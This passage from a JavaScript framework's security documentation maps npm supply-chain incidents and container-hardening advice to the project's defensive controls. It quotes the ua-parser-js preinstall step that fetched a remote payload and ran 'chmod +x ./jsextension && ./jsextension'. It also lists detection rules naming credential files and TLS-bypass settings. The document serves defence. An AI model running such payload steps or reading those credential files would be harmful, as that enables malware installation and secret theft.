incident class so operators get explicit traceability rather than guessing
which gate covers which scenario.

| Incident in the Socket article | DaloyJS control |
| --- | --- |
| **`ua-parser-js` (hijacked maintainer account + `preinstall` miner / credential stealer, Oct 2021)** — attacker pushed `0.7.29` / `0.8.0` / `1.0.0` containing a `preinstall` hook that `curl`'d a remote payload and ran `chmod +x ./jsextension && ./jsextension …` (XMRig miner + Windows credential stealer). Pure CVE scanners had no entry to match against at install time. | Defense-in-depth: (a) **`ignore-scripts=true`** in the root [`.npmrc`](.npmrc) **and** in every scaffolded template `_npmrc` blocks every transitive `preinstall` / `install` / `postinstall` / `prepare` hook on Daloy CI, on maintainer machines, and on any application a developer scaffolds with `create-daloy` — the `ua-parser-js` payload could not detonate on install. (b) **`minimum-release-age=1440` (24 h)** in the same `.npmrc` files refuses to install any dependency whose published age is below the window in which freshly-published hijacks (`ua-parser-js` was unpublished within hours, as were Shai-Hulud, BlokTrooper, TanStack 2026-05-11, and `node-ipc` 9.1.6 / 9.2.3 / 12.0.1) are typically detected and yanked. (c) `pnpm verify:no-lifecycle-scripts` ([`scripts/verify-no-lifecycle-scripts.ts`](scripts/verify-no-lifecycle-scripts.ts)) refuses any forbidden hook in the published manifest of `@daloyjs/core` or `create-daloy`, so a hijacked Daloy publish account cannot ship the `ua-parser-js`-shaped carrier through us either. (d) `pnpm verify:no-remote-exec` refuses any `src/**` file that imports `child_process` / `vm`, calls bare `eval(...)`, constructs `new Function(...)` from a string, or dynamically `import("https://...")` of remote code — the exact `curl … \| sh`-equivalent primitives the `ua-parser-js` shell payload would need to land at runtime if the `preinstall` channel were unavailable. (e) `@daloyjs/core` declares **zero runtime dependencies** ([`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)), so consumers of `@daloyjs/core` carry no transitive `npm install` surface that an analogous hijack could ride into via the framework. |
| **`event-source-polyfill` (protestware / runtime behavioral change, Mar 2022 onward — still live on npm)** — maintainer added code that runs `setTimeout(…, 15000)` after import, checks `Intl.DateTimeFormat().resolvedOptions().timeZone` against a hard-coded list of Russian time zones, and only then `alert(…)`'s a political message and `window.open`'s a `change.org` URL. There is no CVE because there is no traditional "vulnerability" — only an intentional, maintainer-introduced behavioral change. | This class is the hardest of the three to detect generically, and DaloyJS deliberately shrinks the surface rather than trying to classify behavior at runtime. (a) **Zero runtime dependencies** in `@daloyjs/core` ([`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)) means there is no transitive runtime tree through which protestware in some upstream package can change Daloy's behavior — a consumer who installs `@daloyjs/core` and nothing else is not exposed via us. (b) The framework runs **server-side only** (Node / Bun / Deno / Cloudflare Workers / Vercel Edge); `window.open` / `alert` / browser `Intl.DateTimeFormat` have no surface in core. The `event-source-polyfill` payload as written cannot execute inside a Daloy handler because the global APIs it depends on are not present in any of Daloy's runtime adapters. (c) `pnpm verify:no-remote-exec` refuses bare `eval(...)`, `new Function(...)` from a string, and dynamic remote `import(...)` in `src/**`, so a protestware-style maintainer who later took over `@daloyjs/core` itself could not introduce a deferred-execution carrier through these primitives. (d) `pnpm verify:no-invisible-unicode` refuses Unicode-Tag / zero-width / bidi-override / Private-Use-Area / mid-file BOM characters in every published file, so a protestware author cannot hide a region-targeting check from PR reviewers using the GlassWorm / Trojan Source carriers. (e) The `minimum-release-age=1440` cooldown plus daily Scorecard/CodeQL/Socket-style external monitoring (operators are encouraged to enable Socket / Aikido / Snyk on their **own** application tree — `@daloyjs/core` is not the entire dependency graph) gives the community time to flag a region-targeting behavioral change before it ships in any package a Daloy consumer installs. We are explicit (§ Explicitly out of scope) that DaloyJS cannot police behavioral changes in packages **outside** `@daloyjs/core` and `create-daloy`; the framework's contribution to that risk is zero. |
| **`event-stream` (malicious-maintainer handoff + obfuscated payload, Nov 2018)** — original maintainer transferred ownership to a new account that added `flatmap-stream` as a dep and shipped an encrypted payload that decrypted with the `npm_package_description` of a specific Bitcoin-wallet downstream (`copay-dash`) and patched `./node_modules/@zxing/library/.../ReedSolomonDecoder.js` at runtime to exfiltrate private keys. No CVE; bypassed every CVE-based scanner. | Four independent layers each break a different step of the `event-stream` chain. (a) **No malicious-handoff risk for `@daloyjs/core` / `create-daloy` itself:** publishing is gated on the `<!-- BEGIN ACTIVE -->` block of [`SECURITY-CONTACTS.md`](SECURITY-CONTACTS.md) — the pre-publish `verify` job in [`release.yml`](.github/workflows/release.yml) refuses to publish unless `github.actor` is in that block, hardware-backed 2FA is mandatory at both the GitHub-org and npm-registry level, the `npm-publish` GitHub Environment requires a per-publish maintainer approval click, publishing uses npm Trusted Publishing (OIDC) with **no long-lived `NPM_TOKEN`** anywhere, and the quarterly disclosure exercise (§ Maintainer accounts) re-verifies the active rotation and the account-recovery-email domains so a dormant-maintainer takeover is checkable rather than assumed. A silent ownership transfer in the `event-stream` style cannot reach `pnpm publish` without surfacing on at least one of those checks. (b) **Obfuscation carriers are refused at the gate:** `pnpm verify:no-invisible-unicode` ([`scripts/verify-no-invisible-unicode.ts`](scripts/verify-no-invisible-unicode.ts)) refuses Unicode-Tag, zero-width, bidi-override, Private-Use-Area, and mid-file BOM characters in every published file **and** every in-repo source root; `pnpm verify:no-remote-exec` refuses `eval(...)`, `new Function(...)` from a string, dynamic remote `import("https://...")`, and `child_process` / `vm` imports in `src/**` — the exact primitives a `flatmap-stream`-style encrypted-payload decryptor needs (`createDecipher` + dynamic `require` + `writeFileSync` of decrypted JS) to land. The published tarball is also restricted by `package.json#files` to `dist/` + `bin/` + `README.md`, and every tarball ships `npm provenance` (Sigstore + OIDC) bound to the public `release.yml` workflow run, closing the "npm bytes ≠ GitHub bytes" gap that hid the `event-stream` payload from human review. (c) **No registry-exfiltration channel from runtime code:** `pnpm verify:no-registry-exfiltration` refuses TLS-verification bypass (`rejectUnauthorized: false`, `NODE_TLS_REJECT_UNAUTHORIZED` mutation), `process.env.HOME` mutation, references to host credential files (`~/.npmrc`, `~/.netrc`, `~/.gem/credentials`, `~/.yarnrc[.yml]`), and string literals naming registry publish endpoints — the GemStuffer-class primitives an `event-stream`-shaped payload would chain after stealing Bitcoin keys. (d) **24 h cooldown narrows the window for the rest of the consumer's tree:** even outside `@daloyjs/core`, `minimum-release-age=1440` in every scaffolded template `_npmrc` means an `event-stream`-style malicious republish of any dep cannot land on a consumer's machine inside the window where these payloads are typically detected and yanked. |

What this **does not** defend against, said explicitly so operators do not
mis-scope the claim:

- **Protestware in a package the consumer installs directly that is not
  `@daloyjs/core` / `create-daloy`.** The framework contributes zero
  transitive runtime tree, but it cannot stop a downstream application from
  installing a future `event-source-polyfill`-style package directly. Pair
  Daloy with a behavioral scanner (Socket / Aikido / Snyk Reachability) on
  the **application's** dependency tree, as recommended in the Socket
  article.
- **A maintainer-introduced behavioral change inside `@daloyjs/core` itself
  that does not trip `verify:no-remote-exec` / `verify:no-invisible-unicode`
  / `verify:no-registry-exfiltration` / `verify:no-unsafe-buffer` / the
  release-author allowlist.** The mitigation here is process, not code: the
  `npm-publish` Environment approval, the SECURITY-CONTACTS active-rotation
  gate, the public Sigstore-attested workflow run, and the published
  source-to-tarball binding via `npm provenance` make any such change
  publicly auditable per release. Anyone running a green `pnpm audit` should
  still review the diff between Daloy releases when the security-sensitive
  surface (`src/router.ts`, `src/middleware.ts`, `src/jwt.ts`, the
  `secureHeaders`/`csrf`/`session`/`rateLimit` modules, the adapter
  bindings, and the `scripts/verify-*.ts` gates themselves) changes. That
  reviewability is the property the CVE-based-scanner model lacks; it is
  why this section exists.

### Aikido x Root.io container & base-image hardening mapping

The Aikido x Root.io 2026 write-up
["Harden your containers without the headaches"](https://www.aikido.dev/blog/aikido-x-root-io-harden-your-containers-without-the-headaches)
makes the case that the container is the other half of the supply chain:
even with a perfect `npm install` posture, the base image you `FROM` carries
its own OS / language CVEs, ships utilities (`curl`, `wget`, `sh`, package
managers, compilers) that a downloaded-runtime payload can land on, and
silently re-resolves to a new digest on every build when the tag is a
floating `:latest` / `:24-alpine`. Root.io's pitch is two-sided: zero-CVE
drop-in base images **and** CVE-first remediation at pinned versions. The
table below is the framework's mapping — DaloyJS does not vend base images,
but `create-daloy` ships a container-first template and a `container-scan`
CI workflow that close most of the same gap with free, open-source controls.

| Aikido x Root.io concern | DaloyJS / `create-daloy` control |
| --- | --- |
| **`:latest` is tomorrow's malware, pinned-by-tag is yesterday's CVE.** A floating tag re-resolves on every build, so today's scan does not describe tomorrow's image. A hard-pinned tag drifts behind real CVE disclosures because no one rebuilds. | [`packages/create-daloy/templates/node-basic/_Dockerfile`](packages/create-daloy/templates/node-basic/_Dockerfile) ships a `NODE_IMAGE` build-arg so the runtime base is consumed as `node:24-alpine@sha256:<digest>` (the docstring shows the exact `docker build --build-arg NODE_IMAGE=…@sha256:<digest>` invocation). The scaffolded [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) now runs a **Pin check (FROM @sha256 digest)** step that emits a `::warning` PR annotation for every unpinned `FROM` line (skipping `scratch` and ARG-templated images so a brand-new scaffold still goes green). To keep the digest fresh instead of stale, the scaffolded [`dependabot.yml`](packages/create-daloy/templates/_ci/node/_github/dependabot.yml) registers the `docker` ecosystem with a weekly cadence — Dependabot opens a PR when a newer digest is published, so the pin is *both* reproducible *and* current. |
| **Zero-CVE base images / dropping the attack surface that a downloaded payload can land on.** Root.io's image catalog promises a minimal runtime with no compiler / package manager / shell. | The shipped `_Dockerfile` uses `node:*-alpine` with a two-stage build: builder installs deps with `pnpm install --frozen-lockfile --ignore-scripts`, runner is a fresh alpine layer that adds **only** `tini` (`apk add --no-cache tini`) — no `curl`, no `bash`, no compiler, no package manager beyond what Alpine ships by default. The healthcheck uses BusyBox `wget` already present in `node:*-alpine` rather than pulling `curl` in. The runner runs as a non-root UID 1001 user under `tini` as PID 1, with `STOPSIGNAL SIGTERM` so the framework's graceful-shutdown drain fires and `HEALTHCHECK` wired to `app.readinesscheck()` / `/readyz`. The accompanying [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) instructs operators to run the container with `--read-only` / `readOnlyRootFilesystem: true`, which is what removes the writable filesystem a downloaded-runtime carrier (Lightning 2026-04-30 / Shai-Hulud reload) would need to land. |
| **CVE-first remediation — fix what you're running.** Root.io's selling point is a continuous patch stream for the base image, not "rebuild and pray." | Three layers, none of them paid: (a) [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) runs **hadolint** (CIS Docker Benchmark coverage on the Dockerfile), **Trivy filesystem** (config + secrets + vulnerable lockfile entries, `severity: HIGH,CRITICAL`, SARIF to Code Scanning), and **Trivy image** (OS + language CVEs, `severity: HIGH,CRITICAL`, `vuln-type: os,library`, **blocking on CRITICAL by default**) on every PR, every push to `main`, and on a weekly cron so newly-disclosed base-image CVEs are caught even when the Dockerfile itself hasn't changed. (b) The `docker` Dependabot ecosystem opens a digest-bump PR when the upstream `node:24-alpine` image is republished with a new layer set. (c) The repo's own [`vuln-scan.yml`](.github/workflows/vuln-scan.yml) runs `pnpm audit --prod` daily against the committed lockfile — the language-side counterpart to the base-image side covered by Trivy. Together these are the open-source equivalent of the "CVE in → patch out" loop the Root.io article describes, minus the paid agent. |
| **Transitive dependency patching at pinned versions** ("5 layers deep," the dep the parent project marked "no fix available"). | `@daloyjs/core` declares **zero runtime dependencies** ([`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts)), so there is no transitive runtime tree shipped through the framework that could be stuck on an unfixed CVE in the first place. Scaffolded templates pin every dep in a committed `pnpm-lock.yaml` ([`pnpm verify:lockfile`](scripts/verify-lockfile-sources.ts) refuses non-registry sources), `minimum-release-age=1440` in every template `_npmrc` defers freshly-published versions for 24 h, and `ignore-scripts=true` blocks install-time payloads from any pinned dep — so a consumer's transitive-CVE problem stays a CVE problem (visible to `pnpm audit` / Trivy / Socket / Aikido) instead of degrading into a stealth code-execution problem. |
| **Lock-in / forced migration risk** of vendor-hosted hardened-image catalogs. | The control surface is the consumer's `Dockerfile`, their `dependabot.yml`, and the SARIF results in the consumer's own Code Scanning tab — there is no Daloy-hosted base image, no Daloy-hosted registry mirror, no Daloy-hosted SBOM service, and no Daloy account or API key required to run any of the workflows above. The template is a starting point: switch the `NODE_IMAGE` ARG to `cgr.dev/chainguard/node`, a Wolfi-based distroless image, or a Root.io catalog image without touching the rest of the workflow. The `container-scan.yml` Trivy step still runs against whatever you swap in. |

What this **does not** defend against, said explicitly so operators do not
mis-scope the claim:

- **A base-image CVE with no fix upstream.** Trivy's `ignore-unfixed: true`
  intentionally suppresses these to keep PR signal high; operators who
  need fix-pending visibility should toggle that flag in their fork of
  the scaffolded workflow. The framework's contribution is making the
  surface small enough (alpine + `tini` only) that the unfixed surface
  is itself small.
- **A runtime image swap performed outside the scaffolded `_Dockerfile`.**
  The pin-check step inspects `./Dockerfile`; if your deploy uses a
  different filename, a remote build context, or a base image picked
  at deploy time by the platform (Cloudflare Workers, Vercel Edge,
  Deno Deploy), Trivy and hadolint do not run there. The respective
  platform templates (`cloudflare-worker`, `vercel-edge`,
  `deno-basic`) deliberately ship without a `Dockerfile` for this
  reason; they ride the platform's own runtime hardening instead.
- **A consumer who edits the `_Dockerfile` to add `curl` / `bash` / a
  compiler back into the runner stage.** That is an opt-in away from
  the shipped posture and outside what the framework can enforce; the
  hadolint SARIF will still flag obvious anti-patterns (DL3008, DL3018)
  and Trivy will still see the added layers.

### Aikido "Container Security — The Dev Guide" mapping

The Aikido 2025 guide
["Container Security — The Dev Guide"](https://www.aikido.dev/blog/container-security-guide)
covers the same surface as the Root.io write-up above (scan images, use
minimal up-to-date bases, enforce least-privilege at runtime) but adds an
explicit **runtime configuration** layer: even with a clean image, a
container launched with the default capability set, no resource limits, and
a writable root filesystem turns a single handler RCE into a host
compromise. The build-time controls (image scanning, base-image pinning,
non-root user, minimal runner surface, secrets scanning, CIS Dockerfile
lint) are all already covered by the **Aikido x Root.io** mapping above,
so this row is the runtime-side complement.

| Container Security Guide concern | DaloyJS / `create-daloy` control |
| --- | --- |
| **"Running as root", "`--privileged` mode", "excessive Linux capabilities", "mounted Docker socket", "no resource limits".** The guide ranks runtime misconfiguration alongside vulnerable base images as a top compromise vector. | [`packages/create-daloy/templates/_ci/node/SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) now ships a **Runtime hardening (`docker run`, Compose, Fly machines)** section that prescribes `--read-only`, `--cap-drop=ALL`, `--security-opt=no-new-privileges:true`, `--security-opt=seccomp=default`, `--pids-limit=256`, `--memory` / `--memory-swap` / `--cpus` limits, and `--tmpfs /tmp:rw,noexec,nosuid,size=64m` — plus an equivalent `compose.yml` snippet and an explicit "never pass `--privileged` / `-v /var/run/docker.sock` / `--pid=host` / `--network=host`" callout. The Kubernetes equivalents (`runAsNonRoot`, `readOnlyRootFilesystem`, `allowPrivilegeEscalation: false`, `capabilities: { drop: ["ALL"] }`, `automountServiceAccountToken: false`) are already documented under **Pod security on Kubernetes** in the same file. The image itself runs as non-root UID 1001 under `tini`, with no writable paths required at runtime, so all of these flags are drop-in. |
| **"Untrusted or malicious images"** from public registries. | The shipped `_Dockerfile` `FROM`s only `node:*-alpine` (an official Docker Library image) with a `NODE_IMAGE` build-arg so consumers can swap to `cgr.dev/chainguard/node` / Wolfi / Root.io without touching the rest of the workflow. Trivy filesystem + image scans in [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) catch known-bad layers regardless of which base the consumer chooses. The framework itself publishes nothing to a container registry and vends no Daloy-hosted base image, so the "did you pull a typosquat?" surface is consumer-owned. |
| **"Secrets and sensitive data baked into images."** | Triple guard. **(a)** Every template ships a `_dockerignore` that excludes `.env` / `.env.*` (except `.env.example`), `.git`, `node_modules`, `coverage`, `dist`, and `*.log` so a `COPY . .` cannot accidentally pull a `.env` into the image. **(b)** The `container-scan.yml` workflow's Trivy filesystem step scans the build context for known secret shapes and uploads SARIF to Code Scanning. **(c)** The framework's own [`pnpm verify:no-leaked-credentials`](scripts/verify-no-leaked-credentials.ts) gate refuses to publish a tarball containing `.env*` / `*.pem` / `*.key` / AWS / GitHub PAT / npm / Slack / Stripe / Google / JWT / PEM / `_authToken=` shapes, so the published `@daloyjs/core` and `create-daloy` tarballs themselves cannot carry a secret into a downstream image's `node_modules`. |
| **"Shifting left: scanning container images in CI/CD (and in registries)."** | Already covered three ways in the Aikido x Root.io mapping above: hadolint + Trivy fs + Trivy image on every PR / push / weekly cron in [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml), the `docker` Dependabot ecosystem opening digest-bump PRs, and the repo's daily [`vuln-scan.yml`](.github/workflows/vuln-scan.yml) running `pnpm audit --prod`. Registry-side scanning (ECR / GAR / Docker Hub) is operator territory and Daloy is registry-agnostic. |

### Aikido "Container Scanning & Vulnerability Management" mapping

The Aikido 2025 write-up
["Container Scanning & Vulnerability Management"](https://www.aikido.dev/blog/container-scanning-vulnerability-management)
treats container scanning as one lobe of a broader vulnerability-management
loop: discover what's in the image (OS + language layers + IaC + secrets),
prioritise by exploitability and reachable severity, integrate the scan
into CI/CD instead of bolting it onto a registry tab no one reads, keep
running on a schedule so newly-disclosed CVEs in already-built images are
caught, and automate remediation (digest bumps, base-image swaps) so the
loop closes without a human in the critical path. Every leg of that loop
is already shipped by the framework, the scaffolded `--with-ci` bundle, or
the publishing pipeline; this row is the explicit per-bullet mapping so an
operator evaluating Daloy against the article can answer "do we already
get this?" without re-reading the surrounding sections.

| Aikido "Container Scanning & Vulnerability Management" bullet | DaloyJS / `create-daloy` control |
| --- | --- |
| **"Build-time image scanning"** — scan the image artifact for OS package CVEs, language-library CVEs, vulnerable configs, and embedded secrets *before* it ships. | [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) runs **hadolint** (CIS Dockerfile lint), **Trivy filesystem** (config + secrets + lockfile-driven library CVEs, SARIF to GitHub Code Scanning), and **Trivy image** (`vuln-type: os,library`, `severity: HIGH,CRITICAL`, blocking on `CRITICAL`) on every PR and every push to `main`. Findings are uploaded to the consumer's own Code Scanning tab — no Aikido / Snyk / Trivy-cloud account required. |
| **"Continuous / scheduled scanning"** — re-scan on a fixed cadence so a CVE disclosed mid-week against an already-built image is caught before the next deploy. | Same [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) registers a **weekly cron** so the Trivy image + filesystem scans rerun against the current `Dockerfile` even when no code changed. The repo's own [`vuln-scan.yml`](.github/workflows/vuln-scan.yml) reruns `pnpm audit --prod` and `pnpm audit` on a **daily cron** for the language side. Both publish SARIF / a failing-job signal, not a silent dashboard. |
| **"Automated remediation"** — close the loop with PRs that bump pinned digests / versions instead of leaving findings to rot in a backlog. | The scaffolded [`dependabot.yml`](packages/create-daloy/templates/_ci/node/_github/dependabot.yml) registers the **`docker` ecosystem** so Dependabot opens a digest-bump PR whenever the pinned base image (`node:24-alpine@sha256:…`) is republished, **plus** the `npm` ecosystem for `pnpm-lock.yaml` so library CVEs get the same auto-PR treatment. Combined with the `NODE_IMAGE` build-arg in [`_Dockerfile`](packages/create-daloy/templates/node-basic/_Dockerfile), the consumer can swap to a hardened base (Chainguard / Wolfi / Root.io) without forking the workflow. |
| **"SBOM as the inventory layer"** — vulnerability management is impossible without a current bill of materials of what's in the image / tarball. | `@daloyjs/core` and `create-daloy` ship **CycloneDX 1.5 + SPDX 2.3 SBOMs** generated by [`scripts/generate-sbom.ts`](scripts/generate-sbom.ts) and pinned at release time by [`pnpm verify:sbom`](scripts/verify-sbom.ts); both [`ci.yml`](.github/workflows/ci.yml) and [`release.yml`](.github/workflows/release.yml) run `pnpm gen:sbom` + `pnpm verify:sbom` and fail the publish if the SBOM is missing, stale, or inconsistent with `package.json`. The scaffolded `deploy.yml` for container templates attaches an **SPDX SBOM attestation** to each GHCR image so downstream Trivy / Grype / Aikido scanners can ingest the inventory without re-deriving it. |
| **"Signed artefacts so the scanner trusts what it's scanning"** — pull policy without provenance lets an attacker swap the image between scan and deploy. | `@daloyjs/core` and `create-daloy` are published with **npm provenance** (`provenance: true`); the scaffolded `deploy.yml` signs every pushed GHCR image with **Sigstore Cosign** (keyless OIDC) and the SPDX SBOM attestation above is bound to the signed digest. Consumers verify with `cosign verify` + `cosign verify-attestation --type spdxjson` rather than trusting the registry alone. |
| **"Integrate the scan into the pull request, not just the registry."** | Trivy + hadolint findings post as SARIF to GitHub Code Scanning, which surfaces them inline on the PR's *Files changed* tab and on the *Security* tab — the same surface CodeQL uses. A `CRITICAL` Trivy image finding fails the job and blocks merge by default; HIGH is non-blocking SARIF so the loop signal stays high. |
| **"Prioritise by exploitability, not raw CVE count"** — reduce false positives so the loop stays sustainable. | Trivy is configured with `ignore-unfixed: true` (suppresses CVEs with no upstream fix so the PR signal is *actionable*), `vuln-type: os,library` (skips package-manager-only metadata findings), and `severity: HIGH,CRITICAL` (drops `LOW`/`MEDIUM` noise from the PR-blocking step). Operators who need fix-pending visibility flip `ignore-unfixed` to `false` in their fork of the workflow. The hadolint config in the same workflow allow-lists DL3008 (apt pin) explicitly for `node:*-alpine`, which doesn't ship apt, instead of letting the rule fire as a false positive. |
| **"Shrink the attackable surface so there's less to scan"** — minimal base, no compiler/shell/package-manager in the runner stage, non-root user. | The shipped [`_Dockerfile`](packages/create-daloy/templates/node-basic/_Dockerfile) uses a two-stage build: builder runs `pnpm install --frozen-lockfile --ignore-scripts`; runner is a fresh `node:*-alpine` layer that adds **only** `tini`. No `curl` / `bash` / compiler / package manager beyond what Alpine ships. The runner runs as non-root UID 1001 under `tini` as PID 1, with `STOPSIGNAL SIGTERM` so the framework's graceful drain fires and `HEALTHCHECK` wired to `app.readinesscheck()` / `/readyz`. The scaffolded [`SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) prescribes `--read-only`, `--cap-drop=ALL`, `--security-opt=no-new-privileges:true`, `--security-opt=seccomp=default`, `--pids-limit`, and `--tmpfs /tmp:noexec,nosuid` for `docker run`; equivalent Kubernetes pod-security flags are documented in the same file. |
| **"Don't ship secrets in the image."** | Triple guard. **(a)** Every template ships a `_dockerignore` that excludes `.env` / `.env.*` (except `.env.example`), `.git`, `node_modules`, `coverage`, `dist`, and `*.log` so a `COPY . .` cannot leak a `.env`. **(b)** Trivy filesystem in [`container-scan.yml`](packages/create-daloy/templates/_ci/node/_github/workflows/container-scan.yml) scans the build context for known secret shapes (AWS / GCP / Stripe / GitHub PAT / npm token / JWT / PEM) and uploads SARIF to Code Scanning. **(c)** [`pnpm verify:no-leaked-credentials`](scripts/verify-no-leaked-credentials.ts) blocks the publish itself if any of those shapes appear in the tarball — so a stolen `.env` cannot ride from the framework into a downstream image's `node_modules`. |

What this **does not** cover, said explicitly so operators do not
mis-scope the claim:

- **Runtime / "in-cluster" image scanning** (eBPF-driven runtime CVE
  detection of containers already running in production). The scaffolded
  workflow is build-time + scheduled-cron only. Operators who need
  runtime detection should layer an admission-time scanner (Kyverno
  policy that requires `cosign verify` against the framework's keyless
  identity) and a runtime scanner (Falco / Tetragon / commercial
  equivalent) on top of the framework's build-time controls.
- **Registry-side scanning** (ECR Enhanced Scanning, GAR Container
  Analysis, Docker Hub vulnerability tab). Daloy is registry-agnostic
  and does not assume any particular registry; the scaffolded
  `deploy.yml` pushes to GHCR by default, but consumers swap to ECR /
  GAR / Quay without touching the rest of the workflow. Registry-side
  scans are an *additional* layer, not a replacement for the in-CI
  Trivy run.
- **Non-Docker platform runtimes** (Cloudflare Workers, Vercel Edge,
  Deno Deploy). These templates deliberately ship without a
  `Dockerfile`; they ride the platform's own runtime hardening instead.
  The `container-scan.yml` workflow no-ops cleanly when no `Dockerfile`
  is present at the repo root.

### Aikido "vibe coders security checklist" mapping

The Aikido 2025 write-up
["Vibe Check: The vibe coder's security checklist"](https://www.aikido.dev/blog/vibe-check-the-vibe-coders-security-checklist)
enumerates the controls a non-specialist building with LLM-generated code
should have in place before shipping — five common vulnerability classes
(XSS, SQLi, path traversal, secrets leakage, supply chain) plus three tiers
of operational controls (Level 0 git hygiene + secrets + DDoS + don't roll
your own auth/crypto; Level 1 CI/CD + dependency monitoring + malware in
deps + lockfiles + WAF; Level 2 containers + cloud). DaloyJS is a backend
framework, not a hosting platform, so several "Level 2" items (cloud account
separation, CSPM, cloud budget alerts) are operator territory by definition
— but every item the framework can plausibly own ships in core, in the
scaffolded templates, or in the publishing pipeline today. The table below
is the explicit mapping so a vibe coder evaluating Daloy can answer "does
this framework already handle the checklist?" without reverse-engineering
the codebase.

| Aikido checklist item | DaloyJS / `create-daloy` control |
| --- | --- |
| **Cross-Site Scripting (XSS)** — attacker-controlled input rendered into HTML. | Core ships **no** template engine and **no** string-eval rendering API. The only HTML emitted by core is the optional API-docs page, whose interpolated values are HTML-escaped via the helper in [`src/docs.ts`](src/docs.ts) and regression-tested against `<script>` / quote-break payloads in [`tests/docs-logger-adapters.test.ts`](tests/docs-logger-adapters.test.ts). `secureHeaders()` ships CSP with a per-request nonce + Trusted Types so any HTML rendered by user code gets a default-deny script policy. See the **SSTI** and **Clickjacking / MIME sniffing / cross-origin leakage** rows in the in-scope table above. |
| **SQL injection** — string-concatenated SQL with user input. | Out of scope by design (no ORM in core), but called out explicitly in § Explicitly out of scope so vibe coders don't assume the framework guards their query builder. Use a parameterized driver (`postgres`, `drizzle-orm`, `kysely`, `prisma`) — every example in the [website docs](website/app/docs) and every blog post that touches persistence uses parameterized queries, never string concatenation. |
| **Path traversal** — `../` in a URL or filename to escape a safe directory. | The router rejects `..` and `//` in URL paths before walking ([`src/router.ts`](src/router.ts)), and the `except()` auth matcher consumes the same `url.pathname` so a case-mutated or rewrite-style path cannot skip auth while still reaching a protected handler (Qinglong CVE-2026-3965 / CVE-2026-4047 class, regression-tested in [`tests/path-auth-bypass-regression.test.ts`](tests/path-auth-bypass-regression.test.ts)). For file uploads, `fileField()` does **not** trust the client-supplied filename — magic-byte validation is the source of truth for content type and scriptable image formats (SVG / MVG / MSL / PostScript / EPS) are refused by default. |
| **Secrets leakage** — `.env`, API keys, private keys committed to git or shipped in the tarball. | Three layers. **(a) Scaffolded `_gitignore`** in every `create-daloy` template ignores `.env` / `.env.*` (except `.env.example`), `node_modules/`, `dist/`, `coverage/`, and `*.log` — the carriers in the Lovable-leaked-public-key incident the article cites. **(b) `_env.example`** ships in every template instead of a real `.env`, so the "ChatGPT told me to commit my keys" workflow has nowhere to land. **(c) Three-layer leaked-credentials gate** on every Daloy publish: `package.json#files` whitelist + filename gate (`.env*`, `id_rsa*`, `*.pem`, `*.key`, `.npmrc`, `.netrc`, `credentials*.json`, …) + content gate scanning for AWS / GitHub PAT / npm / Slack / Stripe / Google / JWT / PEM / `_authToken=` patterns (`pnpm verify:no-leaked-credentials`, run in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)). See the **Leaked credentials in the published tarball** row in the in-scope table above. |
| **Supply chain attacks** — a poisoned upstream package detonating in your tree. | Covered exhaustively above (Socket "Inside your `node_modules`", Socket "vulnerability scanning isn't enough", Socket "limitations of CVE-based scanners", and Aikido "prevent fallout" mappings). The short version: `@daloyjs/core` declares **zero runtime dependencies** so consumers carry no transitive risk via us; `ignore-scripts=true` + `minimum-release-age=1440` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` block install-time hooks and 24 h of hot-path exposure for everything the consumer *does* install; `pnpm verify:lockfile` refuses non-registry sources; `pnpm verify:no-vulnerable-sandboxes` blocks `vm2` / `safe-eval` / `notevil` / `static-eval` / `eval-sandbox` from entering as a direct dep or via the lockfile. |
| **Level 0 — Git best practices** (`.gitignore` for sensitive files, signed commits, branch separation). | Templates ship a `_gitignore` (above) that excludes `.env` / `.env.*` / `node_modules/` / `dist/` / `coverage/` / `*.log` / `generated/` out of the box. The framework itself signs every release tag and release commit ([§ Maintainer accounts](#maintainer-accounts)) and the publish workflow refuses to run from anything other than a signed tag push or maintainer dispatch ([§ npm publishing](#npm-publishing)). Branch separation is a workflow concern Daloy cannot enforce in a consumer's repo, but the scaffolded `_CI` ships a `pull_request` / `push` separation that mirrors the framework's own. |
| **Level 0 — Keep secrets separate from code.** | Templates ship `_env.example` rather than `.env`, and the [`packages/create-daloy/templates/_ci/node/SECURITY.md`](packages/create-daloy/templates/_ci/node/SECURITY.md) starter instructs operators to load runtime secrets from the platform's secret manager (Fly machine secrets, Cloudflare Workers Secrets, AWS Parameter Store, etc.) rather than a checked-in file. Core's `defineConfig()` ([`src/config.ts`](src/config.ts)) reads from `process.env` with Standard-Schema validation, never from a committed JSON. |
| **Level 0 — Protect against DDoS.** | Network-layer DoS (SYN floods, amplification) is out of scope by design — the article itself recommends fronting with a CDN / WAF for this. Application-layer DoS is in scope and covered in core: body-size cap (default 1 MiB, `Content-Length` rejected pre-read), per-handler timeout (30 s default), Node-adapter `requestTimeout` + `headersTimeout` + `maxHeaderSize` ceilings, `rateLimit()` middleware with a Redis backend ([`src/rate-limit-redis.ts`](src/rate-limit-redis.ts)) for multi-instance deployments, and `loadShedding()` that returns `503` based on event-loop lag / RSS / heap before the runtime hangs. The **Body-size DoS**, **Slow handlers / runaway loops**, and **Trusted-proxy header spoofing** rows in the in-scope table above are the regression-tested guarantees. |
